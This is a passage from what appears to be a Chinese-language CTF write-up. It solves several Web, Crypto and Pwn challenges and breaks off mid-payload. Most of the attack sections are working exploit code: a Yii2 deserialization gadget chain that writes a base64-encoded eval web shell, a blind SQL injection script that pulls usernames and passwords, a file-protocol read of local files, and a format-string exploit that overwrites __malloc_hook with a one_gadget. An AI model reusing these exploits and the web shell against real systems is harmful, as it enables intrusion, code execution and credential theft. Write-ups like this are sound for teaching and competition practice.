class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'assert'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">"file_put_contents('cop.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NvcCddKTs='));"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//file_put_contents('cop.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NvcCddKTs='));</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">'isRunning'</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">'run'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $processes;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> Generator()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地用system一直失败所以尝试用assert 写shell<br>写入shell之后蚁剑连接，发现根目录存在readflag，Disable_functions禁用了系统函数，用蚁剑的绕过插件apache_mod_cgi模板一键绕过执行readflag</p><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>主页加载图片 image.php发现注入点<br>注入Exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line">n=<span class="number">2</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">27</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    m=<span class="number">64</span></span><br><span class="line">    j=<span class="number">64</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> q!=<span class="number">1</span>:</span><br><span class="line">            j=j/<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">                m=m+j</span><br><span class="line">            <span class="keyword">elif</span> n==<span class="number">0</span>:</span><br><span class="line">                m=m-j</span><br><span class="line">        m=int(m)</span><br><span class="line">        <span class="comment">#exp="1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)^1" .format (i,m)</span></span><br><span class="line">        <span class="comment">#exp="1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),&#123;&#125;,1))&gt;&#123;&#125;)^1".format (i,m)</span></span><br><span class="line">        exp=<span class="string">"1^(ascii(substr((select(group_concat(username,password))from(users)),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span>.format(i,m)</span><br><span class="line">        url=<span class="string">'http://eci-2ze8j3xqhbs4re3pkykz.cloudeci1.ichunqiu.com/image.php?id=&#123;&#125;'</span>.format(exp)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        p=requests.get(url,timeout=<span class="number">100</span>)</span><br><span class="line">        <span class="keyword">if</span> len(p.text)&gt;<span class="number">1</span>:</span><br><span class="line">            n=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> q==<span class="number">7</span>:</span><br><span class="line">            <span class="keyword">if</span> len(p.text)&gt;<span class="number">1</span>:</span><br><span class="line">                flag=flag+chr(m+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag=flag+chr(m)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><p>注出账号密码admin/db83298098fb07d4ee64c 登陆后发现host参数支持file协议可以读取本地文件，读取file:///flag 拿到flag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Primegame"><a href="#Primegame" class="headerlink" title="Primegame"></a>Primegame</h3><p>原题改的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">getcontext().prec = int(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">100</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(primes)):</span><br><span class="line">    keys.append(Decimal(int(primes[i])).ln())</span><br><span class="line"></span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> keys:</span><br><span class="line">    arr.append(int(v * int(<span class="number">16</span>) ** int(<span class="number">64</span>)))</span><br><span class="line"></span><br><span class="line">ct = <span class="number">597952043660446249020184773232983974017780255881942379044454676980646417087515453</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(res)</span>:</span></span><br><span class="line">    h = Decimal(int(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(keys)):</span><br><span class="line">        h += res[i] * keys[i]</span><br><span class="line"></span><br><span class="line">    ct = int(h * int(<span class="number">16</span>)**int(<span class="number">64</span>))</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(N)</span>:</span></span><br><span class="line">    ln = len(arr)</span><br><span class="line">    A = Matrix(ZZ, ln + <span class="number">1</span>, ln + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(ln):</span><br><span class="line">        A[i, i] = <span class="number">1</span></span><br><span class="line">        A[i, ln] = arr[i] // N</span><br><span class="line">        A[ln, i] = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    A[ln, ln] = ct // N</span><br><span class="line"></span><br><span class="line">    res = A.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(ln + <span class="number">1</span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(ln):</span><br><span class="line">            <span class="keyword">if</span> <span class="number">-64</span> &lt;= res[i][j] &lt; <span class="number">64</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            vec = [int(v + <span class="number">64</span>) <span class="keyword">for</span> v <span class="keyword">in</span> res[i][:<span class="number">-1</span>]]</span><br><span class="line">            ret = encrypt(vec)</span><br><span class="line">            <span class="keyword">if</span> ret == ct:</span><br><span class="line">                print(N, bytes(vec))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"NO"</span>, ret, bytes(vec))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">10000</span>):</span><br><span class="line">    print(i)</span><br><span class="line">f(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">getcontext().prec = int(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">100</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(primes)):</span><br><span class="line">    keys.append(Decimal(int(primes[i])).ln())</span><br><span class="line"></span><br><span class="line">arr = []</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> keys:</span><br><span class="line">    arr.append(int(v * int(<span class="number">16</span>) ** int(<span class="number">64</span>)))</span><br><span class="line"></span><br><span class="line">ct = <span class="number">425985475047781336789963300910446852783032712598571885345660550546372063410589918</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(res)</span>:</span></span><br><span class="line">    h = Decimal(int(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(keys)):</span><br><span class="line">        h += res[i] * keys[i]</span><br><span class="line"></span><br><span class="line">    ct = int(h * int(<span class="number">16</span>)**int(<span class="number">64</span>))</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(N)</span>:</span></span><br><span class="line">    ln = len(arr)</span><br><span class="line">    A = Matrix(ZZ, ln + <span class="number">1</span>, ln + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(ln):</span><br><span class="line">        A[i, i] = <span class="number">1</span></span><br><span class="line">        A[i, ln] = arr[i] // N</span><br><span class="line">        A[ln, i] = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    A[ln, ln] = ct // N</span><br><span class="line"></span><br><span class="line">    res = A.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(ln + <span class="number">1</span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(ln):</span><br><span class="line">            <span class="keyword">if</span> <span class="number">-64</span> &lt;= res[i][j] &lt; <span class="number">64</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            vec = [int(v + <span class="number">64</span>) <span class="keyword">for</span> v <span class="keyword">in</span> res[i][:<span class="number">-1</span>]]</span><br><span class="line">            ret = encrypt(vec)</span><br><span class="line">            <span class="keyword">if</span> ret == ct:</span><br><span class="line">                print(N, bytes(vec))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"NO"</span>, ret, bytes(vec))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">10000</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    f(i)</span><br></pre></td></tr></table></figure><h3 id="Hpcurve"><a href="#Hpcurve" class="headerlink" title="Hpcurve"></a>Hpcurve</h3><p>原题改的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">K = GF(p)</span><br><span class="line">R.&lt;x&gt; = K[]; y=x</span><br><span class="line">f = y + prod(map(eval, <span class="string">'yyyyyyy'</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_u_from_out</span><span class="params">(output, known_input)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">        res.append(output[i]^^known_input[i])</span><br><span class="line">    res = bytes(res)</span><br><span class="line">    u0, u1, u2 = struct.unpack(<span class="string">"&lt;QQQ"</span>, res)</span><br><span class="line">    u = x^<span class="number">3</span>+x^<span class="number">2</span>*u2+x*u1+u0</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v_from_u</span><span class="params">(u)</span>:</span></span><br><span class="line">    Kbar = GF(p^<span class="number">6</span>)</span><br><span class="line">    Rbar.&lt;t&gt; = Kbar[<span class="string">"t"</span>]</span><br><span class="line">    u2 = u.change_ring(Rbar)</span><br><span class="line">    roots = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> u2.roots()]</span><br><span class="line">    ys = []</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">        ys.append(f(root).sqrt(<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> product(range(<span class="number">2</span>), repeat=<span class="number">3</span>):</span><br><span class="line">        poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">        <span class="keyword">if</span> poly[<span class="number">0</span>] <span class="keyword">in</span> K:</span><br><span class="line">            res.append(R(poly))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_decode</span><span class="params">(output, u, v)</span>:</span></span><br><span class="line">    rs = [u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], v[<span class="number">0</span>], v[<span class="number">1</span>], v[<span class="number">2</span>]]</span><br><span class="line">    otp = struct.pack(<span class="string">"&lt;QQQQQQ"</span>, *rs)</span><br><span class="line">    plain = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">        plain.append(output[i]^^otp[i%len(otp)])</span><br><span class="line">    <span class="keyword">return</span> bytes(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">output = bytes.fromhex(<span class="string">"66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5"</span>)</span><br><span class="line">known_input = <span class="string">b"aaaaaaaaaaaaaaaaaaaaflag&#123;"</span></span><br><span class="line">u = get_u_from_out(output, known_input)</span><br><span class="line">vs = get_v_from_u(u)</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> vs:</span><br><span class="line">    print(try_decode(output,u,v))</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="parser"><a href="#parser" class="headerlink" title="parser"></a>parser</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">pdbg = pwn_debug(<span class="string">"./chall"</span>)</span><br><span class="line">debug = <span class="number">3</span></span><br><span class="line"><span class="comment">#pdbg.context.terminal=['tmux', 'splitw', '-h']</span></span><br><span class="line">pdbg.local() </span><br><span class="line">pdbg.debug(<span class="string">"2.27"</span>)  <span class="comment">#2.23 ... 2.29</span></span><br><span class="line">pdbg.remote(<span class="string">"xxx.xxx.xxx.xxx"</span>,xxx) <span class="comment">#IP,PORT</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    r = pdbg.run(<span class="string">"debug"</span>)</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    r = pdbg.run(<span class="string">"local"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = pdbg.run(<span class="string">"remote"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr)</span>:</span></span><br><span class="line">    pdbg.bp([addr])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(r)</span>:</span></span><br><span class="line">    text_base = r.libs()[r._cwd+r.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> r.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,r.libs()[key]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confirm</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">" ==&gt; "</span>+hex(address))</span><br><span class="line">    </span><br><span class="line">elf = pdbg.elf</span><br><span class="line">libc = pdbg.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendn</span><span class="params">(content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a%234$p"</span> </span><br><span class="line"><span class="comment">#confirm(ret_addr)</span></span><br><span class="line">sendn(payload1)</span><br><span class="line"><span class="comment"># 0x5da710</span></span><br><span class="line">libc_base = int(r.recvuntil(<span class="string">"&gt;"</span>,drop=<span class="number">1</span>),<span class="number">16</span>) - <span class="number">0x3e7638</span></span><br><span class="line">confirm(libc_base)</span><br><span class="line">one_getgad = libc_base + <span class="number">0x4f3c2</span></span><br><span class="line">confirm(one_getgad)</span><br><span class="line">payload2 = <span class="string">"GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: -1\n\x0a"</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">t1=one_getgad&amp;<span class="number">0xff</span></span><br><span class="line">payload2 += <span class="string">"%"</span> + str(t1) + <span class="string">"c"</span> +<span class="string">"%"</span> + str(<span class="number">31</span>) + <span class="string">'$hhn'</span>  + <span class="string">"a"</span> * <span class="number">9</span> +  p64(malloc_hook) + <span class="string">"a"</span> *<span class="number">8</span></span><br><span class="line">confirm(malloc_hook)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">t2=one_getgad&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span></span><br><span class="line">payload2 = <span class="string">"GET / HTTP/1.1\nHost: xxx.xxx.xxx.xxx:xxx\nConnection: Close\nAccept-Encoding: gzip\nContent-Length: 